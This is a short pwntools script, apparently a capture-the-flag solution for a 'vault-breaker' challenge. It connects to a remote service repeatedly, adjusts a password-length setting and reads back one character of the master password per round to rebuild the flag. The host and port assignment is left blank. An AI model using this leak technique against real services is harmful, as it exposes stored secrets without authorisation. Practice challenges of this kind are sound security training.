from pwn import *

flag = ''
for i in range(32):
	#io = process('./vault-breaker')
	ip, port = 
	io = remote(ip, port)
	io.sendlineafter('> ', '1')
	io.sendlineafter('[*] Length of new password (0-31): ', str(i))
	io.sendlineafter('> ', '2')
	io.recvuntil('Master password for Vault: ')
	flag += io.recv(1024)[i]
	io.close()

print flag
